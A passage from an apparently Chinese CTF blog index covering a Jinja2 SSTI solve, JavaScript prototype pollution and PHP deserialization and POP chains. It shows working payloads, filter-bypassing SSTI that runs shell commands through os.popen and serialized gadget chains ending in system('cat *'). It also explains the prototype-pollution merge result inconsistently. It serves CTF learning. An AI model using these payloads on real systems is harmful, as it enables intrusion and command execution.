app.run(host='127.0.0.1',port=5000)\n```\n\n![](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412151847862.png)\n\n拿payload直接打\n\n```\ncode={%set gl='_'*2+'globals'+'_'*2%}{%set bu='_'*2+'builtins'+'_'*2%}{%set im='_'*2+'i''mport'+'_'*2%}{%set rr='so'[::-1]%}{{cycler.next[gl][bu][im](rr)['p''open']('echo `ls /` > app.py').read()}}\n```\n\n![](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412151848872.png)\n\n```\ncode={%set gl='_'*2+'globals'+'_'*2%}{%set bu='_'*2+'builtins'+'_'*2%}{%set im='_'*2+'i''mport'+'_'*2%}{%set rr='so'[::-1]%}{{cycler.next[gl][bu][im](rr)['p''open']('echo `cat /flag` > app.py').read()}}\n```\n\n![](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412151849782.png)\n\n# hello web\n\n![](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412151903324.png)\n\n看注释看到了一个这个提示\n\n访问后发现，得....//绕过\n\n![](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412151911177.png)\n\n这么个事儿\n\n![image-20241215191139648](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412151911700.png)\n\n它是个🐎啊\n\n![image-20241215202829273](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412152028604.png)\n\n蚁剑连接在/run/log/这个里面的其中一个文件夹中有flag\n\n~~sxweb1明明按道理应该出的，™的一直报500.......5555555...还是菜。。。~~\n\n","tags":["-web -ciscn&ccb"]},{"title":"JS原型链污染","url":"/2024/12/13/JS原型链污染/","content":"\n# JS原型链污染\n\nnodejs和javascript语法和标准有些不同，应用场景不一样，但是在原型链污染这方面可以互通。\n\n### JS创建对象的三种方法\n\n```javascript\njs创建对象的三种方法 ：\n\n普通创建\n\nvar person={name:'lihuaiqiu','age','19'}\n\nvar person={}  //创建空对象\n\n构造函数方法创建\n\nfunction person(){\n    this.name=\"liahuqiu\";\n    this.test=function () {\n        return 1;\n\t}\n}\nperson.prototype.a=3;\nweb=new person();\nconsole.log(web.test());\nconsole.log(web.a)\n\n通过object创建\n\nvar a=new Object();\na.c=3\nconsole.log(a.c)\n```\n\n## 原型链\n\n#### 原型\n\njavascript里的每一个对象（object），都有一些内置属性（property），原型本身也是一个对象，所以他也有自己的原型，这就形成了一个原型链，当一个原型的原型是null，原型链就会在这里结束。\n\n这个”原型“属性是一个指向对象原型的一个对象，这个属性没有统一的称呼，但是浏览器都支持使用 ”\\_\\_proto_\\_“来查看原型。访问一个对象原型的标准方法是使用 ”Object.getPrototypeOf()“。\n\n##### Prototype 原型 | 原型对象\n\n1、Prototype它是【函数的】一个属性\n\n2、Protopype是个对象\n\n3、当我们创建函数的时候会默认添加Prototype这个属性\n\n##### __proto\\_\\_ 隐式原型\n\n1、【对象】的属性\n\n2、指向构造函数的Protopype\n\n3、obj._\\_proto__ === test.prototype   等于true\n\n##### 原型链顶层\n\nObject.prototype.__proto\\_\\_     等于null\n\n##### 原型链查找\n\ninstanceof运算符可以用来判断某个构造函数的prototype属性是否存在另外一个要检测对象的原型链\n\n```\nfunction My(){}\nfunction You(){}\n\nvar myOne=new My();\nconsole.info(myOne instanceof My)  //true\nconsole.info(myOne instanceof You)  //false\n```\n\n**JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作prototype继承链。**\n\n##### 示例\n\n```javascript\nfunction test (name) {\n\tthis.name=name\n    this.a=1\n} //这只是一个普通函数\n\nconst obj = new test('xiaoming')  //使用new生成obj对象了，test此时就是构造函数，任何函数都可以是构造函数\nconsole.log(obj.a) //返回 1\ntest.prototype.b=2  //给函数原型添加b属性，值为2\nconsole.log(obj.b) //返回2\nObject.prototype.c=3  //给顶层添加c属性，值为3\nconsole.log(obj.c) //返回3\nconsole.log(obj.__proto__ === test.prototype)  //对象的__proto__等于函数的原型\nconsole.log(test.prototype.__proto__ === Object.prototypre) //函数原型对象的__proto__属性就等于Object函数的原型  返回ture\nconsole.log(Object.prototype.__proto__) //Object函数的原型对象的__proto__属性等于NULL，因为Object是顶层\n```\n\n##### 结构剖析\n\n```javascript\nobj {\n    a:1,                                  //a属性，值为1\n\t__proto__:test.prototype ={           //obj.__proto__指向test.prototype\n        b:2,                              //函数原型添加的b属性，值为2\n\t\t__proto__:Object.prototype = {  //test.prototype.__proto__指向Object.prototypre\n            c:3,                          //顶层添加的c属性，值为3\n\t\t\t__proto__:null              //Object.prototype.__proto__指向null   \n\t\t}\n\t}\n}\n```\n\n##### 链子剖析\n\n```\nobj -> __proto__ -> test.prototype -> __proto__ -> Object.prototype -> __proto__ -> null\n```\n\n这就是obj的原型链\n\n#### 原型链污染\n\n因为原型链就是套娃的，一级接着一级，属性是从上面往下叠加的，下面的都会继承上面的属性，如果我们在原型链的上级添加了恶意对象，那么原型链就会被污染，后续创建的对象都可以继承并调用恶意对象。\n\n![](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412132318079.png)\n\n如果服务端使用某些可以复制、继承变量的函数，函数的参数是用户可控，那么就有可能造成原型链污染攻击。\n\n此时b的上级原型a的属性已经被污染，b继承a后，也可以调用恶意对象。\n\n#### 原型链污染利用\n\n在javascript中，function是一个用于定义函数的关键字，Function是代表所有函数的内置原型对象。\n\n##### constructor概念\n\nObject.prototype.constructor其中constructor是一个对象的数据属性，创建对象后，访问constructor属性，可以返回构造该对象的来源【就是告诉你它是从哪来的】（不是该对象的原型链上级，两者不同）\n\n```\ndemo：\nvar a=1;\na.__proto__\n//Number {0, toExponential: ƒ, toFixed: ƒ, toPrecision: ƒ, toString: ƒ, …}\na.__proto__.constructor\n//Number() { [native code] }\na.constructor\n//Number() { [native code] }\na.constructor === Number\n//true\nvar b=Number(1);\nb.constructor === a.constructor\n//true\n\n```\n\n##### **`constructor` 和 `prototype` 的角色**\n\n##### **`constructor` 的作用**\n\n- 每个 JavaScript 对象都有一个 `constructor` 属性，默认情况下，它指向创建该对象的构造函数。\n\n- 例如：\n\n  ```javascript\n  const obj = {};\n  console.log(obj.constructor === Object); // true\n  ```\n\n##### **`prototype` 的作用**\n\n- 构造函数的 `prototype` 属性是实例对象的默认原型（即实例的 `__proto__`）。\n\n- 例如：\n\n  ```javascript\n  function MyClass() {}\n  const obj = new MyClass();\n  console.log(obj.__proto__ === MyClass.prototype); // true\n  ```\n\n##### **两者的关系**\n\n- 修改构造函数的 `prototype` 会影响由该构造函数创建的所有对象的原型。\n- 通过 `constructor.prototype` 可以间接修改对象的原型链，甚至是全局对象的原型。\n\n所以，当我们的_\\_proto__被过滤了，我们可以直接用constructor.prototype绕过\n\n```\nfunction merge(target, source) {\n    for (let key in source) {\n        if (key == \"__proto__\") {\n            continue;\n        }\n        if (key in target && key in source) {\n            merge(target[key], source[key])\n        } else {\n            target[key] = source[key]\n        }\n    }\n}\n\nlet payload = JSON.parse('{\"constructor\": {\"prototype\": {\"polluted\": \"Yes, I am polluted!\"}}}');\n\nlet user={}\nmerge(user, payload);\n\n// 验证\nconsole.log({}.polluted); // \"Yes, I am polluted!\"\n```\n\n##### Function概念\n\n每一个javascript的function实际上都是Function对象，Function是javascript内置的对象，Function用以实现很多基本的功能，如Number、toString等。\n\n```\n (function () {}).constructor\n //Function() { [native code] }\n (function () {}).constructor === Function\n //true\n```\n\n###### Function() constructor \n\nFunction()构造器可以创建一个Function对象，可以直接调用Function()构造器动态的创建函数。但是会存在像eval()的安全隐患和一些性能问题。\n\neval()和Function区别:\n\n1、eval()可以访问本地的变量、全局变量\n\n2、Funtion()创建函数时只能执行全局变量\n\n![image-20241116203304251](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412132318206.png)\n\n![image-20241116204011412](https://kingofyou.oss-cn-beijing.aliyuncs.com/D:%5CBolg%5Chexo-blog%5Csource%5C_posts%5C%E6%B5%8B%E8%AF%95%E6%96%87%E7%AB%A0202412132318959.png)\n\n### JSON.parse\n\n看一个经典的递归合并函数\n\n```javascript\nfunction merge(target,source) {\n\tfor (let key in source) {\n\t\tif (key in source && key in target) {\n\t\t\tmerge(target[key],source[key])\n\t\t}else{\n\t\t\ttarget[key]=source[key]\n\t\t}\n\t}\n}\n\nlet o1={}\nlet o2={a: 1,\"__proto__\": {b:2}}\nmerge(o1,o2)\nconsole.log(o1.b)\n\no3={}\nconsole.log(o3.b)\n[Running] node \"payload.js\"\n2\nundefined\n[Done] exited with code=0 in 0.199 seconds\n```\n\n核心思想是理解 `__proto__` 在对象定义中的行为，以及它在合并操作中如何影响目标对象。以下是逐步解释：\n\n#### 1. **`__proto__` 的行为**\n\n在 JavaScript 中，`__proto__` 是一个特殊属性，用于设置对象的原型。它不是普通的键，而是与对象的原型链相关。\n\n##### 当 `__proto__` 被用作键：\n\n```javascript\nlet o2 = {a: 1, \"__proto__\": {b: 2}};\n```\n\n- 在这种情况下，`__proto__` 表面上看是一个普通的键值对。\n- **实际行为**：`__proto__` 这个键会被特殊处理，将 `{b: 2}` 作为 `o2` 的原型，而不是普通的对象属性。\n\n相当于：\n\n```javascript\no2.a = 1;\no2.__proto__ = {b: 2}; // o2 继承了 {b: 2} 作为它的原型。\n```\n\n结果：\n\n- `o2.a` 是 o2 自己的属性。\n- `o2.b` 不直接存在于 o2，而是来自于它的原型 `{b: 2}`。\n\n如果直接访问 `o2.b`，JavaScript 会通过原型链查找，因此 `o2.b` 的值是 `2`。\n\n#### 2. **合并函数的行为**\n\n我们来看 `merge` 函数：\n\n```javascript\nfunction merge(target, source) {\n    for (let key in source) {\n        if (key in source && key in target) {\n            merge(target[key], source[key]);\n        } else {\n            target[key] = source[key];\n        }\n    }\n}\n```\n\n- **`for...in` 循环**：\n  遍历 `source` 的所有可枚举属性，包括继承的属性（从原型链上来的）。\n- **`key in source` 判断**： 确保 `key` 是 `source` 中的一个属性（包括自身和原型链）。\n\n#### 3. **为什么只有 `a` 被合并？**\n\n当你执行：\n\n```javascript\nlet o1 = {};\nlet o2 = {a: 1, \"__proto__\": {b: 2}};\nmerge(o1, o2);\nconsole.log(o1.b); // undefined\n```\n\n#### 关键点：\n\n- **`for...in` 不会直接枚举 `__proto__` 作为普通键。**\n- `o2` 只有一个直接属性 `a`，因此 `merge` 函数中只会处理 `a`。\n- `__proto__` 被用作原型设置，`{b: 2}` 成为了 `o2` 的原型。\n\n因此：\n\n- **`o1` 合并结果**：`o1.a = 1`。\n- **`o1.b` 是 undefined**：因为 `b` 是 `o2` 的原型属性，而 `merge` 函数不会递归或复制原型链的属性。\n\n#### 4. **为什么 `o1.b = 2` 这句话不成立？**\n\n合并后，`o1` 并没有 `b`，因为：\n\n- `b` 并不是 `o2` 自身的属性，而是其原型的属性。\n- `merge` 函数只处理直接属性，未复制 `b` 到 `o1`。\n\n**总结：** `__proto__` 在对象字面量中会被解释为设置原型，而不是普通键值对。所以，`merge` 只会处理 `o2` 的直接属性（`a`），不会处理通过原型链继承的 `b`，因此 `o1.b` 仍然是 `undefined`。\n\n#### 5.为什么运行结果确是2\n\n运行结果来看，`console.log(o1.b)` 返回了 `2`，这表明在某种程度上确实读取到了属性 `b`，而这是从 `__proto__` 原型链继承的属性。我们重新分析以下几个关键点，帮助理解为什么会发生这种现象：\n\n#### 5.1. **`__proto__` 在对象字面量中的作用**\n\n当你定义：\n\n```javascript\nlet o2 = { a: 1, \"__proto__\": { b: 2 } };\n```\n\n`o2` 的结构变成：\n\n```javascript\no2 = {\n  a: 1,\n  __proto__: { b: 2 }\n};\n```\n\n这意味着 `o2` 的原型被设置为 `{ b: 2 }`，即 `o2` 通过原型链可以访问 `b`。\n\n#### 5.2. **`merge` 函数如何工作**\n\n```javascript\nfunction merge(target, source) {\n    for (let key in source) {\n        if (key in source && key in target) {\n            merge(target[key], source[key]);\n        } else {\n            target[key] = source[key];\n        }\n    }\n}\n```\n\n- **`for...in` 的行为**： `for...in` 会迭代 `source` 的**可枚举属性**，包括继承自原型的属性。\n\n在这个情况下：\n\n- `o2` 的直接属性是 `a`。\n- `o2` 通过原型链继承了属性 `b`，且 `b` 是可枚举的。\n\n#### 5.3. **执行过程**\n\n当 `merge(o1, o2)` 执行时：\n\n- `key = \"a\"`：将 `o2.a` 的值 `1` 合并到 `o1`。\n- `key = \"b\"`：由于 `b` 是从 `__proto__` 继承的，它也被 `for...in` 迭代到，因此 `o2.b` 的值 `2` 被赋值到 `o1.b`。\n\n最终，`o1` 的内容是：\n\n```javascript\no1 = {\n  a: 1,\n  b: 2\n};\n```\n\n#### 5.4. **为什么 `console.log(o1.b)` 输出 `2`？**\n\n当 `merge` 函数运行完后，`o1` 对象被赋予了一个新属性 `b`，其值为 `2`。因此，当你执行：\n\n```javascript\nconsole.log(o1.b); // 输出 2\n```\n\n这正是由于 `b` 被直接合并到 `o1` 的原因。\n\n#### 6. **这是否算原型污染？**\n\n**不算真正的原型污染**，原因如下：\n\n- **污染的定义**：原型污染意味着修改了原型对象（如 `Object.prototype`），导致所有对象都受到影响。\n- 你的操作仅仅是在 `o1` 上设置了一个普通属性 `b`，并没有修改全局原型链。因此，其他对象（如 `{}`）并不会受到影响。\n\n#### 7. **验证是否污染了全局原型**\n\n你可以验证：\n\n```javascript\nconsole.log({}.b); // 如果是原型污染，会输出 2，但是输出的是undefined\n```\n\n若结果为 `undefined`，说明没有污染全局原型。\n\n#### 结论\n\n你当前的 `merge` 操作仅仅是将 `b` 合并到了 `o1` 对象上，没有导致原型污染。 **要实现原型污染，需要明确操作全局原型链（例如通过修改 `Object.prototype`）**。\n\n#### 好，那么我们言归正传，如何才能真正污染呢？\n\n主角登场--请看下面代码\n\n```javascript\nfunction merge(target, source) {\n    for (let key in source) {\n        if (key in source && key in target) {\n            merge(target[key], source[key])\n        } else {\n            target[key] = source[key]\n        }\n    }\n}\nlet o1 = {}\nlet o2 = JSON.parse('{\"a\": 1, \"__proto__\": {\"b\": 2}}')\n//注意let o2 = {\"a\": 1, \"proto\": {\"b\": 2}}这种写法和let o2 = {a: 1, \"__proto__\": {b: 2}}写法结果是一样的\nmerge(o1, o2)\nconsole.log(o1.a, o1.b)\n \no3 = {}\nconsole.log(o3.b)\n\n[Running] node \"d:\\web\\污染\\PCB-notadmin\\payload.js\"\n1 2\n2\n\n[Done] exited with code=0 in 2.918 seconds\n```\n\n#### 1. **`JSON.parse` 和 `__proto__` 的作用**\n\n在 `JSON.parse` 中，`{\"__proto__\": {\"b\": 2}}` 会被解析为：\n\n```javascript\n{\n  a: 1,\n  __proto__: { b: 2 }\n}\n```\n\n此时，`o2` 的 `__proto__` 实际上是一个普通属性，而不是原型链。\n\n但是，当 `merge` 函数执行以下语句时：\n\n```javascript\ntarget[key] = source[key];\n```\n\n那么如果 `key` 是 `__proto__`，它会触发 **原型链修改**，这样就相当于给最顶层的Object.prototype所指向的对象添加了属性，所以我们随便创建一个对象也就有了b这个属性 。\n\n#### 2. **原型污染的发生**\n\n在 `merge(o1, o2)` 中：\n\n- `key = \"a\"`：`o1.a = 1`，无问题。\n- `key = \"__proto__\"`：`o1[\"__proto__\"] = { b: 2 }`。\n\n当设置 `o1[\"__proto__\"] = { b: 2 }` 时，实际上修改了 `o1` 的原型链，使 `o1` 和所有继承自 `Object.prototype` 的对象（包括 `o3`）的原型被污染。\n\n因此：\n\n- `o1.b` 等于 `2`，因为 `b` 来自于被污染的原型。\n- `o3.b` 也等于 `2`，即使 `o3` 本身没有 `b`，它仍然从全局的 `Object.prototype` 继承了污染。\n\n#### 3. **验证污染**\n\n可以通过以下方式验证污染：\n\n```javascript\nconsole.log({}.b); // 输出 2，说明 Object.prototype 被污染\n```\n\n这就是JS原型链污染基础了。\n\n\n\n[js原型链污染(超详细)](https://blog.csdn.net/qq_51586883/article/details/119867720)\n\n[服务端原型链污染漏洞](https://carsaid.github.io/burpsuite-learn/wsa/advanced/prototype-pollution/server-side/)","tags":["-NodeJs -pollution"]},{"title":"PHP反序列化&SESSION反序列化","url":"/2024/07/16/PHP反序列化-SESSION反序列化/","content":"\n# PHP反序列化&SESSION反序列化\n\n## PHP反序列化基本概念\n\nphp序列化就是将一个对象，进行变换成一个字符串，这个字符串就是一个个键值对，方便传输数据，那反序列化，就是把它翻过来，从一个个键值对再转换成一个对象。\n\n### 示例\n\n```php\n<?php\nclass test{\n    public $name='ooo';\n    public $age=18;\n}\n$t=new test();\necho serialize($t);\n?>\n    \n输出：  \nO:4:\"test\":2:{s:4:\"name\";s:3:\"ooo\";s:3:\"age\";i:18;}\n\n解释：\nO:4:\"test\":2;：表示这是一个对象（Object），类名是test，类名长度为4，包含2个属性。\ns:4:\"name\";s:3:\"ooo\";：第一个属性是字符串类型（String），属性名为name，长度为4，对应的值为字符串ooo，长度为3。\ns:3:\"age\";i:18;：第二个属性也是字符串类型（String），属性名为age，长度为3，对应的值为整数（Integer）18。\n综上所述，这段代码表示一个类名为test的对象，它有两个属性：name（值为\"ooo\"）和age（值为18）。\n```\n\n## [PHP反序列化的几个必知魔术方法](https://zhuanlan.zhihu.com/p/377676274)\n\n```php\n__construct()，类的构造函数,在创造一个对象时候，首先会去执行的一个方法。但是在序列化和反序列化过程是不会触发的。\n\n__destruct()，类的析构函数,在到某个对象的所有引用都被删除或者当对象被显式销毁时执行的魔术方法。\n\n__call()，在对象中调用一个不可访问方法时,__call() 会被调用。也就是说你调用了一个对象中不存在的方法，就会触发。\n\n__callStatic()，在静态上下文中调用一个不可访问方法时，__callStatic() 会被调用。\n\n__get()，读取不可访问属性的值时，__get() 会被调用。__get魔术方法需要一个参数，这个参数代表着访问不存在的属性值。\n\n__set()，给不可访问属性赋值时，__set() 会被调用。\n\n__isset()，当对不可访问属性调用isset()或empty()时调用,该魔术方法使用了isset()或者empty()只要属性是private或者不存在的都会触发。\n\n__unset()，当对不可访问属性调用unset()时被调用。如果一个类定义了魔术方法 __unset() ，那么我们就可以使用 unset() 函数来销毁类的私有的属性，或在销毁一个不存在的属性时得到通知。\n\n__sleep()，执行serialize()时，先会调用这个函数\n\n__wakeup()，执行unserialize()时，先会调用这个函数\n\n__toString()，类被当成字符串时的回应方法\n\n__invoke()，调用函数的方式调用一个对象时的回应方法\n\n__set_state()，调用var_export()导出类时，此静态方法会被调用。\n\n__clone()，当使用 clone 关键字拷贝完成一个对象后，新对象会自动调用定义的魔术方法 __clone() ，如果该魔术方法存在的话。\n\n__autoload()，尝试加载未定义的类\n\n__debugInfo()，打印所需调试信息\n\n```\n\n### 小试牛刀-----[NewStarCTF 2023 公开赛道]Unserialize？\n\n```php\n <?php\nhighlight_file(__FILE__);\n// Maybe you need learn some knowledge about deserialize?\nclass evil {\n    private $cmd;\n\n    public function __destruct()\n    {\n        if(!preg_match(\"/cat|tac|more|tail|base/i\", $this->cmd)){\n            @system($this->cmd);\n        }\n    }\n}\n\n@unserialize($_POST['unser']);\n?> \n\npayload:\nPOST:unser=O:4:\"evil\":1:{s:3:\"cmd\";s:35:\"sort /th1s_1s_fffflllll4444aaaggggg\";}\n```\n\n## PHP的POP链\n\n按我自己的理解，PHP的pop链就是通过改变对象的属性，改变对象的元素的属性，去触发相应的魔术方法，来进行一个链式反应，以此来达到我们的目的。\n\n### 示例(触发tostring方法，进行链式反应)\n\n```php\n<?php\nclass a{\n    public $x;\n    public $y;\n    public function __destruct(){\n        echo $this->x;\n    }\n}\nclass b{\n    public $o;\n    public function __tostring(){\n        echo \"111\";\n        return \"flag{this_is_flag}\";\n    }\n}\n\n$a1 = new a();\n$b1 = new b();\n$a1->x=new b();\n$s=serialize($a1);\n?>\n\nD:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\php.exe -c D:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\php.ini D:\\PhpstormProjects\\untitled1\\payload.php\n\n111flag{this_is_flag}\nProcess finished with exit code 0\n//这就是一个简单的链式反应\n```\n\n### 小试牛刀-----[MRCTF2020]Ezpop\n\n```php\n <?php\n//flag is in flag.php\n//WTF IS THIS?\n//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95\n//And Crack It!\nclass Modifier {\n    protected  $var;\n    public function append($value){\n        include($value);\n    }\n    public function __invoke(){\n        $this->append($this->var);\n    }\n}\n\nclass Show{\n    public $source;\n    public $str;\n    public function __construct($file='index.php'){\n        $this->source = $file;\n        echo 'Welcome to '.$this->source.\"<br>\";\n    }\n    public function __toString(){\n        return $this->str->source;\n    }\n\n    public function __wakeup(){\n        if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this->source)) {\n            echo \"hacker\";\n            $this->source = \"index.php\";\n        }\n    }\n}\n\nclass Test{\n    public $p;\n    public function __construct(){\n        $this->p = array();\n    }\n\n    public function __get($key){\n        $function = $this->p;\n        return $function();\n    }\n}\n\nif(isset($_GET['pop'])){\n    @unserialize($_GET['pop']);\n}\nelse{\n    $a=new Show;\n    highlight_file(__FILE__);\n} \n\n\npaylod：\n$s=new Show(); //创建show对象\n$s->source=new Show();  //将source属性赋为一个新的show对象，触发tostring函数\n$s->source->str=new Test();\t //给$a->source->str创建test对象，则$a->source->str->source属性不存在，执行__get函数\n$s->source->str->p=new Modifier();//将Modifier对象赋给p属性，一个链子就此完成。\necho urlencode(serialize($s));\n```\n\n## [2022DASCTF X SU 三月春季挑战赛]ezpop\n\n```php\n<?php\n\nclass crow\n{\n    public $v1;\n    public $v2;\n\n    function eval() {\n        echo new $this->v1($this->v2);\n    }\n\n    public function __invoke()\n    {\n        $this->v1->world();\n    }\n}\n\nclass fin\n{\n    public $f1;\n\n    public function __destruct()\n    {\n        echo $this->f1 . '114514';\n    }\n\n    public function run()\n    {\n        ($this->f1)();\n    }\n\n    public function __call($a, $b)\n    {\n        echo $this->f1->get_flag();\n    }\n\n}\n\nclass what\n{\n    public $a;\n\n    public function __toString()\n    {\n        $this->a->run();\n        return 'hello';\n    }\n}\nclass mix\n{\n    public $m1;\n\n    public function run()\n    {\n        ($this->m1)();\n    }\n\n    public function get_flag()\n    {\n        eval('#' . $this->m1);\n    }\n\n}\n$a=new fin();\n$a->f1=new what();\n$a->f1->a=new mix();\n$a->f1->a->m1=new crow();\n$a->f1->a->m1->v1=new fin();\n$a->f1->a->m1->v1->f1=new mix();\n$a->f1->a->m1->v1->f1->m1='?><?php system(\"cat *\")?>';//这题太狗了，把flag放在注释里，还得cat *才能看到。\necho serialize($a);\n```\n\n## PHP的字符串逃逸\n\n字符串逃逸就是通过改变字符串的长度来改变键值对，让键值对改变成我们想要的样子，这个就跟php的特性有关了\n\n### PHP的特性\n\n#### 1、序列化后，底层代码是以 ; 作为字段的分隔，以 } 作为结尾(字符串除外)，所以}在后面的是没有任何影响的\n\n```php\n<?php\nclass s{\n    public $a;\n    public $b;\n    function __construct($a,$b){\n        $this->a = $a;\n        $this->b = $b;\n    }\n}\n$a =new s(\"a\",\"b\");\necho serialize($a);\n?>\nD:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\php.exe -c D:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\php.ini D:\\PhpstormProjects\\untitled1\\payload.php\nO:1:\"s\":2:{s:1:\"a\";s:1:\"a\";s:1:\"b\";s:1:\"b\";}\nProcess finished with exit code 0\n此时，如果变成O:1:\"s\":2:{s:1:\"a\";s:1:\"a\";s:1:\"b\";s:1:\"b\";}54656156135\nvar_dump(unserialize('O:1:\"s\":2:{s:1:\"a\";s:1:\"a\";s:1:\"b\";s:1:\"b\";}54656156135'));\n{\n  [\"a\"]=>\n  string(1) \"a\"\n  [\"b\"]=>\n  string(1) \"b\"\n}\n丝毫没有影响正常的反序列化\n```\n\n#### 2、当序列化的长度不对应的时候会出现报错\n\n```php\n<?php\nclass s{\n    public $a;\n    public $b;\n    function __construct($a,$b){\n        $this->a = $a;\n        $this->b = $b;\n    }\n}\n$a =new s(\"a\",\"b\");\necho serialize($a);\nvar_dump(unserialize('O:1:\"s\":2:{s:1:\"a\";s:2:\"a\";s:1:\"b\";s:1:\"b\";}54656156135'));\n?>\n\nD:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\php.exe -c D:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\php.ini D:\\PhpstormProjects\\untitled1\\payload.php\nO:1:\"s\":2:{s:1:\"a\";s:1:\"a\";s:1:\"b\";s:1:\"b\";}bool(false)\n\nProcess finished with exit code 0\n可以看到，返回false，就是无法正常反序列化\n```\n\n#### 3、可以反序列化类中不存在的元素\n\n```php\n<?php\nclass s{\n    public $a;\n    public $b;\n    function __construct($a,$b){\n        $this->a = $a;\n        $this->b = $b;\n    }\n}\n$a =new s(\"a\",\"b\");\necho serialize($a);\nvar_dump(unserialize('O:1:\"s\":2:{s:1:\"a\";s:1:\"a\";s:1:\"c\";s:1:\"c\";}'));\n?>\n\nD:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\php.exe -c D:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\php.ini D:\\PhpstormProjects\\untitled1\\payload.php\nO:1:\"s\":2:{s:1:\"a\";s:1:\"a\";s:1:\"b\";s:1:\"b\";}object(s)#2 (3) {\n  [\"a\"]=>\n  string(1) \"a\"\n  [\"b\"]=>\n  NULL\n  [\"c\"]=>\n  string(1) \"c\"\n}\n看到类里面并没有c，但是能正常反序列化\n```\n\n### PHP字符串逃逸\n\n字符串逃逸一般有两种情况，一种是字符串增多，一种是字符串减少\n\n字符串逃逸的本质也是差不多就是闭合，有一种注入的感觉\n\n#### 增多的情况\n\n```php\nfunction waf($str){\n    return str_replace(\"bad\",\"good\",$str);\n}\nclass s{\n    public $a;\n    public $b='666';\n    public function __construct($a){\n        $this->a = $a;\n    }\n    public function __destruct(){\n        echo $this->b;\n    }\n}\n$a =new s(\"bad\");\necho serialize($a);\n//echo waf(serialize($a));\n?>\n//O:1:\"s\":2:{s:1:\"a\";s:3:\"bad\";s:1:\"b\";s:3:\"666\";}这是没有经过替换的\n//O:1:\"s\":2:{s:1:\"a\";s:3:\"good\";s:1:\"b\";s:3:\"666\";}这是经过替换掉的\n明显每替换一个，字符串长度就会+1，那我们现在不像让b为666，想让它是888，但是b是不可控的，怎么办，那就是字符串逃逸了，我们看一下逃逸字符串的长度\";s:1:\"b\";s:3:\"888\";}，21个，长度为21.\n那就是21个bad就能让\";s:1:\"b\";s:3:\"666\";}逃逸，即\n<?php\nfunction waf($str){\n    return str_replace(\"bad\",\"good\",$str);\n}\nclass s{\n    public $a;\n    public $b='666';\n    public function __construct($a){\n        $this->a = $a;\n    }\n    public function __destruct(){\n        echo $this->b;\n    }\n}\n$a =new s('badbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbadbad\";s:1:\"b\";s:3:\"888\";}');\n//echo serialize($a);\necho (waf(serialize($a)));\nvar_dump(unserialize('O:1:\"s\":2:{s:1:\"a\";s:84:\"goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood\";s:1:\"b\";s:3:\"888\";}\";s:1:\"b\";s:3:\"666\";}'));\n//for($i=0;$i<21;$i++){\n//  echo 'bad';\n//}\n?>\n运行结果：\nD:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\php.exe -c D:\\phpstudy_pro\\Extensions\\php\\php7.3.4nts\\php.ini D:\\PhpstormProjects\\untitled1\\payload.php\nO:1:\"s\":2:{s:1:\"a\";s:84:\"goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood\";s:1:\"b\";s:3:\"888\";}\";s:1:\"b\";s:3:\"666\";}object(s)#2 (2) {\n  [\"a\"]=>\n  string(84) \"goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood\"\n  [\"b\"]=>\n  string(3) \"888\"\n}\n888666\n可以看到，成功替换。\n```\n\n#### 减少的情况\n\n```php\n<?php\nfunction waf($str){\n    return str_replace(\"good\",\"hao\",$str);\n}\nclass s{\n    public $a;\n    public $b;\n    public function __construct($a,$b){\n        $this->a = $a;\n        $this->b = $b;\n    }\n    public function __destruct(){\n        echo $this->b;\n    }\n}\n//这个是每替换一个就会减少一个字符，那就意味着我们需要让前面的吞掉后面的，再通过修改$b来实现我们的目的，让前面吞掉\";s:1:\"b\";s:21:，来实现我们的目的，这个原理与增加相似，反过来就行。\n$a =new s('goodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgoodgood','\";s:1:\"b\";s:3:\"888\";}');\n//echo serialize($a);\n//echo 